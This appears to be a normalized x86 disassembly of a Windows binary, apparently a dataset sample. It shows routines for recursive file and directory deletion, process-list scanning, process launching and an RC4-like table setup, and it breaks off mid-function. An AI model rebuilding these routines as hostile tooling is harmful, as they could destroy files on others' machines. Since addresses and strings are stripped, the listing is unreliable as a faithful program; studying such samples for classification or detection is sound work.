je r-xdata
xor eax eax
push 0x5
pop eax
jmp r-xdata
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push esi
push ebx
call [ CreateProcessW@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
mov esi [ esi ]
cmp [ esi + 0x14 ] 0x8
mov [ ebp - 0x18 ] ax
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov al bl
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
mov ecx [ ebp - 0x58 ]
push [ ebp - 0x54 ]
mov [ edi ] ecx
call [ CloseHandle@IAT ]
sub_4089df
push 0x1a4
mov eax sub_41d286
call sub_41089b
mov esi ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor eax eax
xor ebx ebx
cmp [ esi + 0x10 ] ebx
je r-xdata
push eax
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x2c ] 0x7
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x40 ] ax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x28 ] bl
push r--data
mov edx esi
lea ecx [ ebp - 0x198 ]
mov [ ebp - 0x4 ] 0x1
call sub_409448
cmp [ eax + 0x14 ] 0x10
pop ecx
jb r-xdata
push eax
call [ GetFileAttributesA@IAT ]
test al 0x10
je r-xdata
lea ecx [ ebp - 0x180 ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
lea ecx [ ebp - 0x198 ]
mov edi eax
call sub_40203c
cmp edi 0xffffffff
jne r-xdata
mov eax [ eax ]
cmp [ ebp - 0x154 ] 0x2e
je r-xdata
mov esi ebx
jmp r-xdata
lea eax [ ebp - 0x180 ]
push eax
push edi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push r--data
mov edx esi
lea ecx [ ebp - 0x1b0 ]
call sub_409448
pop ecx
push eax
lea ecx [ ebp - 0x28 ]
call sub_4091e5
lea ecx [ ebp - 0x1b0 ]
call sub_40203c
lea eax [ ebp - 0x154 ]
push eax
call sub_401089
pop ecx
push eax
lea eax [ ebp - 0x154 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_40924a
test [ ebp - 0x180 ] 0x10
je r-xdata
lea ecx [ ebp - 0x28 ]
call sub_40203c
push ebx
push 0x1
lea ecx [ ebp - 0x40 ]
call sub_4023e7
mov eax esi
jmp r-xdata
push edi
call [ FindClose@IAT ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ ebp - 0x14 ] 0x10
lea eax [ ebp - 0x28 ]
cmovae eax [ ebp - 0x28 ]
push eax
call [ DeleteFileA@IAT ]
lea ecx [ ebp - 0x28 ]
call sub_4089df
jmp r-xdata
call sub_41084a
retn
push esi
call [ RemoveDirectoryA@IAT ]
mov esi eax
mov esi [ esi ]
sub_408b56
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
call sub_40886e
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40e09b
leave
retn
mov eax [ rw-data ]
test al 0x1
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
and [ rw-data ] 0x0
or eax 0x1
mov [ rw-data ] eax
xor eax eax
push sub_41dbe2
mov [ rw-data ] 0x7
mov [ rw-data ] ax
call sub_40e8b3
pop ecx
xor eax eax
push 0x206
push eax
mov [ ebp - 0x210 ] ax
lea eax [ ebp - 0x20e ]
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x210 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ PathAppendW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
mov ecx rw-data
call sub_4022ce
sub_408c22
push ebp
mov ebp esp
sub esp 0x63c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor eax eax
push 0x616
mov [ ebp - 0x620 ] ax
xor esi esi
lea eax [ ebp - 0x61e ]
push esi
push eax
mov edi ecx
call sub_414160
add esp 0xc
lea ecx [ ebp - 0x620 ]
call sub_40a041
mov bl al
xor eax eax
mov [ ebp - 0x638 ] ax
lea eax [ ebp - 0x620 ]
push eax
lea ecx [ ebp - 0x638 ]
mov [ ebp - 0x624 ] 0x7
mov [ ebp - 0x628 ] esi
call sub_4022ce
lea eax [ ebp - 0x638 ]
push eax
mov ecx edi
call sub_4020cf
push esi
push 0x1
lea ecx [ ebp - 0x638 ]
call sub_4023e7
mov ecx [ edi + 0x10 ]
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov al bl
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
inc esi
cmp esi ecx
jl r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ eax + esi * 2 ] 0x41
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ eax + esi * 2 ] 0x5a
ja r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
add [ eax + esi * 2 ] 0x20
sub_408d02
push 0x4c4
mov eax sub_41d352
call sub_41089b
mov esi ecx
xor eax eax
push 0x206
mov [ ebp - 0x218 ] ax
xor ebx ebx
lea eax [ ebp - 0x216 ]
push ebx
push eax
call sub_414160
add esp 0xc
lea ecx [ ebp - 0x4a0 ]
push esi
call sub_40205d
push 0x104
lea eax [ ebp - 0x218 ]
push eax
push r--data
call [ ExpandEnvironmentStringsW@IAT ]
cmp [ ebp - 0x48c ] 0x8
lea eax [ ebp - 0x4a0 ]
cmovae eax [ ebp - 0x4a0 ]
push eax
lea eax [ ebp - 0x218 ]
push eax
call [ PathAppendW@IAT ]
push ebx
push 0x1
lea ecx [ ebp - 0x4a0 ]
call sub_4023e7
xor eax eax
mov [ ebp - 0x230 ] ax
lea eax [ ebp - 0x218 ]
push eax
lea ecx [ ebp - 0x230 ]
mov [ ebp - 0x21c ] 0x7
mov [ ebp - 0x220 ] ebx
call sub_4022ce
sub esp 0x18
lea eax [ ebp - 0x230 ]
mov ecx esp
push eax
mov [ ebp - 0x4 ] ebx
call sub_40205d
call sub_4090b7
add esp 0x14
lea edx [ ebp - 0x230 ]
lea ecx [ ebp - 0x4b8 ]
mov edi eax
call sub_4086ea
lea edx [ ebp - 0x4b8 ]
lea ecx [ ebp - 0x4d0 ]
mov [ ebp - 0x4 ] 0x1
call sub_4087bf
cmp [ eax + 0x14 ] 0x8
pop ecx
jb r-xdata
lea ecx [ ebp - 0x480 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
push ebx
push 0x1
lea ecx [ ebp - 0x4d0 ]
mov esi eax
call sub_4023e7
cmp esi 0xffffffff
jne r-xdata
mov eax [ eax ]
push esi
call [ FindClose@IAT ]
lea ecx [ ebp - 0x4b8 ]
call sub_40203c
test edi edi
jle r-xdata
lea ecx [ ebp - 0x4b8 ]
call sub_40203c
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x230 ]
call sub_4023e7
mov al bl
call sub_41084a
retn
mov bl 0x1
sub_408e5d
push 0x1c
mov eax sub_41d2e9
call sub_410868
sub esp 0x18
mov ecx esp
push r--data
call sub_402085
xor cl cl
call sub_408ed3
add esp 0x18
test al al
je r-xdata
and [ ebp - 0x18 ] 0x0
xor eax eax
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x28 ] ax
call sub_4022ce
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_408d02
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
mov bl al
call sub_4023e7
xor eax eax
push 0x9
pop ecx
test bl bl
cmovne eax ecx
push 0x3
pop eax
jmp r-xdata
call sub_410836
retn
sub_408ed3
push 0x26c
mov eax sub_41d24e
call sub_41089b
mov [ ebp - 0x259 ] cl
xor ebx ebx
push ebx
push 0x2
mov [ ebp - 0x4 ] ebx
call [ CreateToolhelp32Snapshot@IAT ]
mov edi eax
mov [ ebp - 0x260 ] edi
cmp edi 0xffffffff
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_4023e7
mov al bl
call sub_41084a
retn
push 0x228
lea eax [ ebp - 0x254 ]
push ebx
push eax
mov [ ebp - 0x258 ] 0x22c
call sub_414160
add esp 0xc
xor eax eax
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x28 ] ax
call sub_4022ce
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp + 0x18 ]
xor esi esi
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x258 ]
push eax
push edi
call [ Process32FirstW@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x8 ]
test eax eax
jne r-xdata
inc esi
cmp esi ebx
jl r-xdata
cmp ecx 0x8
lea eax [ ebp + 0x8 ]
cmovae eax edx
cmp [ eax + esi * 2 ] di
ja r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_4022ce
and [ ebp - 0x268 ] 0x0
xor eax eax
mov [ ebp - 0x278 ] ax
lea eax [ ebp - 0x234 ]
push eax
lea ecx [ ebp - 0x278 ]
mov [ ebp - 0x264 ] 0x7
call sub_4022ce
mov ebx [ ebp - 0x268 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x278 ]
call sub_4023e7
xor esi esi
test ebx ebx
jle r-xdata
push edi
call [ CloseHandle@IAT ]
xor bl bl
push 0x41
cmp ecx 0x8
lea eax [ ebp + 0x8 ]
pop edi
cmovae eax edx
push 0x5a
cmp [ eax + esi * 2 ] di
pop edi
jb r-xdata
mov edi [ ebp - 0x260 ]
push 0x20
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_4021dc
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x8 ]
cmp [ ebp - 0x259 ] 0x0
je r-xdata
push 0x5a
pop edi
cmp [ ebp + 0x1c ] 0x8
push [ ebp + 0x18 ]
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
push eax
push [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_402ee3
test eax eax
je r-xdata
push [ ebp + 0x18 ]
cmp [ ebp + 0x1c ] 0x8
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
push ecx
push eax
lea ecx [ ebp - 0x28 ]
call sub_40234d
cmp eax 0xffffffff
jne r-xdata
push eax
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4021dc
inc esi
cmp esi ebx
jl r-xdata
cmp ax di
ja r-xdata
mov bl 0x1
jmp r-xdata
lea eax [ ebp - 0x258 ]
push eax
push edi
call [ Process32NextW@IAT ]
movzx eax [ ebp + esi * 2 - 0x234 ]
push 0x41
pop ecx
cmp ax cx
jb r-xdata
mov edi [ ebp - 0x260 ]
add eax 0x20
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4023e7
sub_4090b7
push 0x29c
mov eax sub_41d314
call sub_41089b
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] 0x8
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
push eax
call [ GetFileAttributesW@IAT ]
test al 0x10
je r-xdata
cmp [ ebp + 0x1c ] 0x8
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
je r-xdata
push ebx
push 0x1
lea ecx [ ebp + 0x8 ]
call sub_4023e7
mov eax esi
call sub_41084a
retn
xor eax eax
mov [ ebp - 0x14 ] 0x7
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x28 ] ax
push r--data
lea edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x290 ]
mov [ ebp - 0x4 ] 0x1
call sub_402bb0
cmp [ eax + 0x14 ] 0x8
pop ecx
jb r-xdata
lea ecx [ ebp - 0x278 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
push ebx
push 0x1
lea ecx [ ebp - 0x290 ]
mov edi eax
call sub_4023e7
cmp edi 0xffffffff
jne r-xdata
mov eax [ eax ]
cmp [ ebp - 0x24c ] 0x2e
je r-xdata
mov esi ebx
jmp r-xdata
lea eax [ ebp - 0x278 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x2a8 ]
call sub_402bb0
pop ecx
push eax
lea ecx [ ebp - 0x28 ]
call sub_4020cf
push ebx
push 0x1
lea ecx [ ebp - 0x2a8 ]
call sub_4023e7
lea ecx [ ebp - 0x24c ]
call sub_40102f
push eax
lea eax [ ebp - 0x24c ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_402546
inc esi
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_4023e7
push edi
call [ FindClose@IAT ]
sub_4091e5
push ebp
mov ebp esp
push esi
mov esi ecx
cmp esi [ ebp + 0x8 ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
and [ esi + 0x10 ] 0x0
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi ] 0x0
call sub_4020fe
push [ esi ]
call j_sub_40e8f2#2
pop ecx
sub_40921d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ecx + 0x10 ]
ja r-xdata
sub eax [ ecx + 0x10 ]
push 0x0
push eax
call sub_4021dc
cmp [ ecx + 0x14 ] 0x8
mov [ ecx + 0x10 ] eax
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
jmp r-xdata
mov ecx [ ecx ]
pop ebp
retn 0x4
sub_40924a
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_402846
test al al
je r-xdata
mov ecx [ esi + 0x10 ]
or eax 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub eax ecx
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push r--data
call sub_40e036
test ebx ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
pop ebx
lea eax [ ecx + ebx ]
push 0x0
push eax
mov ecx esi
mov [ ebp + 0xc ] eax
call sub_4027e3
test al al
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
push edi
push esi
mov ecx esi
call sub_4092ec
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
mov ecx [ ebp + 0xc ]
mov [ esi + 0x10 ] ecx
jb r-xdata
mov eax [ esi + 0x10 ]
push ebx
add eax ecx
push edi
push eax
call sub_410100
add esp 0xc
test ebx ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + ecx ] 0x0
sub_4092ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov eax [ edi + 0x10 ]
mov ecx [ ebp + 0xc ]
cmp eax ecx
jb r-xdata
push r--data
call sub_40e064
mov ebx [ ebp + 0x10 ]
sub eax ecx
mov ecx [ esi + 0x10 ]
cmp eax ebx
cmovb ebx eax
or eax 0xffffffff
sub eax ecx
mov [ ebp + 0x8 ] ecx
cmp eax ebx
jbe r-xdata
push r--data
call sub_40e036
test ebx ebx
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
lea eax [ ecx + ebx ]
push 0x0
push eax
mov ecx esi
call sub_4027e3
test al al
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov edi [ edi ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add ecx ebx
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ecx
jb r-xdata
mov eax [ ebp + 0xc ]
add eax edi
push ebx
push eax
mov eax [ esi + 0x10 ]
add eax ecx
push eax
call sub_410100
add esp 0xc
test ebx ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + ecx ] 0x0
sub_409392
push ebp
mov ebp esp
push esi
mov esi ecx
or eax 0xffffffff
mov ecx [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
sub eax ecx
cmp eax edi
jbe r-xdata
push r--data
call sub_40e036
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
push ebx
lea ebx [ ecx + edi ]
push 0x0
push ebx
mov ecx esi
call sub_4027e3
test al al
je r-xdata
pop ebx
mov ecx [ esi + 0x10 ]
cmp edi 0x1
jne r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edi
add eax ecx
push 0x0
push eax
call sub_414160
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ebx
jb r-xdata
mov [ eax + ecx ] 0x0
jmp r-xdata
mov [ eax + ebx ] 0x0
sub_409419
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
mov esi edx
call sub_40102f
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_402546
push eax
mov ecx edi
call sub_4020aa
mov eax edi
pop edi
pop esi
leave
retn
sub_409448
push 0x8
mov eax sub_41d223
call sub_410868
mov ebx edx
mov esi ecx
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x1
call sub_401089
add eax [ ebx + 0x10 ]
mov edi [ esi + 0x10 ]
pop ecx
cmp edi eax
ja r-xdata
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_4092ec
push [ ebp + 0x8 ]
call sub_401089
pop ecx
push eax
push [ ebp + 0x8 ]
mov ecx esi
call sub_40924a
mov eax esi
call sub_410836
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_4027e3
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_4094d7
push ebp
mov ebp esp
push ecx
mov eax [ edx + 0x14 ]
sub eax [ edx + 0x10 ]
and [ ebp - 0x4 ] 0x0
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] eax
jbe r-xdata
push 0xffffffff
push 0x0
push ecx
mov ecx edx
call sub_4024a4
mov eax [ ecx + 0x14 ]
sub eax [ ecx + 0x10 ]
cmp eax [ edx + 0x10 ]
jb r-xdata
push ecx
push ecx
push edx
push ecx
call sub_40951f
jmp r-xdata
push eax
mov ecx esi
call sub_4020aa
mov eax esi
pop esi
leave
retn
sub_40951f
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
or eax 0xffffffff
cmp [ ebx + 0x10 ] eax
push esi
push edi
mov esi ecx
mov edi eax
cmovb edi [ ebx + 0x10 ]
mov ecx [ esi + 0x10 ]
sub eax ecx
cmp eax edi
jbe r-xdata
push r--data
call sub_40e036
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
lea eax [ ecx + edi ]
push 0x0
push eax
mov ecx esi
mov [ ebp + 0xc ] eax
call sub_4026e7
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push [ esi + 0x10 ]
lea ecx [ eax + edi * 2 ]
call sub_40106c
pop ecx
cmp esi ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov ebx [ ebx ]
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edi
mov edx ebx
call sub_40104f
cmp [ esi + 0x14 ] 0x8
pop ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x10 ] ecx
jb r-xdata
push edi
call sub_40106c
jmp r-xdata
xor edx edx
mov [ eax + ecx * 2 ] dx
sub_4095f0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
sub esp 0xc
push esi
mov esi ecx
push edi
mov edi [ esi + 0x10 ]
cmp edi edx
jb r-xdata
push r--data
call sub_40e064
push ebx
mov ebx [ ebp + 0x10 ]
mov eax [ ebx + 0x10 ]
cmp eax [ ebp + 0x14 ]
jb r-xdata
mov ebx [ ebp + 0xc ]
mov ecx edi
sub ecx edx
cmp ecx ebx
cmovb ebx ecx
sub eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x18 ]
cmp eax ecx
cmovb ecx eax
mov [ ebp + 0xc ] ebx
mov ebx edi
sub ebx [ ebp + 0xc ]
or eax 0xffffffff
sub eax ecx
mov [ ebp + 0x18 ] ecx
cmp eax ebx
jbe r-xdata
push r--data
call sub_40e036
mov eax [ ebp - 0x4 ]
sub eax [ ebp + 0xc ]
add ebx ecx
mov [ ebp - 0xc ] ebx
cmp edi ebx
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
jae r-xdata
push 0x10
cmp esi ebx
je r-xdata
push 0x0
push [ ebp - 0xc ]
mov ecx esi
call sub_4027e3
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
cmp ecx ebx
ja r-xdata
pop edi
cmp [ esi + 0x14 ] edi
jb r-xdata
mov edi [ ebp + 0x14 ]
cmp edi edx
ja r-xdata
pop edi
cmp [ esi + 0x14 ] edi
jb r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ esi ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x18 ]
jmp r-xdata
lea eax [ edx + ebx ]
cmp eax edi
pop edi
ja r-xdata
pop edi
cmp [ esi + 0x14 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov ebx [ esi ]
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp + 0x10 ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov [ ebp + 0x10 ] esi
mov ebx [ esi ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebp + 0xc ]
jmp r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp [ ebx + 0x14 ] edi
jb r-xdata
push eax
mov eax [ ebp - 0x4 ]
add eax edx
add eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8 ]
add eax edx
add eax ecx
push eax
call sub_40e0b0
add esp 0xc
test eax eax
je r-xdata
mov [ ebp + 0x10 ] esi
mov eax [ esi ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov [ ebp + 0x10 ] esi
mov eax [ esi ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov [ ebp + 0xc ] esi
mov ecx [ esi ]
mov [ ebp + 0xc ] ecx
mov ecx [ ebp + 0x18 ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
add eax [ ebp + 0x14 ]
push ecx
push eax
lea eax [ ebx + edx ]
push eax
call sub_40e0b0
mov ecx [ ebp + 0x18 ]
add esp 0xc
test ecx ecx
je r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov ebx [ ebx ]
mov [ ebp - 0x8 ] esi
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov [ ebp - 0x8 ] esi
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
push eax
mov eax [ ebp + 0x10 ]
add eax edx
add eax ebx
push eax
mov eax [ ebp + 0xc ]
add eax edx
add eax ecx
push eax
call sub_40e0b0
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x8 ]
add esp 0xc
test eax eax
je r-xdata
mov [ ebp + 0x18 ] esi
mov eax [ esi ]
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov [ ebp + 0xc ] esi
mov eax [ esi ]
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0x14 ]
push ebx
push eax
mov eax [ ebp - 0x8 ]
add eax edx
push eax
call sub_40e0b0
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x8 ]
add esp 0xc
test ebx ebx
je r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
push eax
mov eax [ ebp + 0x10 ]
add eax edx
add eax ebx
push eax
mov eax [ ebp - 0x8 ]
add eax edx
add eax ecx
push eax
call sub_40e0b0
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x8 ]
add esp 0xc
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ esi + 0x10 ] ecx
pop ebx
cmp [ esi + 0x14 ] edi
jb r-xdata
mov eax [ ebp + 0x14 ]
add eax ebx
push ecx
push eax
mov eax [ ebp + 0xc ]
add eax [ ebp + 0x8 ]
push eax
call sub_410100
jmp r-xdata
mov ecx [ ebp + 0x18 ]
test ecx ecx
je r-xdata
mov [ ebp + 0x10 ] esi
mov eax [ esi ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov edx [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x18 ]
add eax edx
add eax [ ebp + 0xc ]
push eax
lea eax [ ebx + edx ]
add eax ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
add esp 0xc
mov [ ebp - 0x8 ] esi
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
add eax [ ebp + 0x14 ]
test ecx ecx
je r-xdata
push eax
call sub_40e0b0
mov [ eax + ecx ] 0x0
pop edi
mov eax esi
pop esi
leave
retn 0x14
cmp [ esi + 0x14 ] edi
jb r-xdata
push eax
mov eax [ ebp + 0x10 ]
add eax edx
add eax ebx
push eax
mov eax [ ebp - 0x8 ]
add eax edx
add eax ecx
push eax
call sub_40e0b0
add esp 0xc
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub eax [ ebp + 0xc ]
add eax [ ebp + 0x14 ]
add eax ecx
jmp r-xdata
test ecx ecx
je r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
push ecx
push eax
lea eax [ ebx + edx ]
jmp r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
cmp [ esi + 0x14 ] edi
jb r-xdata
push eax
mov eax [ ebp + 0x14 ]
add eax edx
add eax ecx
push eax
mov eax [ ebp + 0x8 ]
add eax ebx
add eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov eax ecx
sub eax [ ebp + 0xc ]
je r-xdata
sub_40993f
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
test edi edi
je r-xdata
xor eax eax
push ebx
push esi
xor esi esi
mov eax esi
mov [ eax + edi ] al
inc eax
cmp eax 0x100
jl r-xdata
mov ecx esi
mov [ ebp - 0x4 ] esi
mov ecx [ ebp - 0x4 ]
mov al [ esi + edi ]
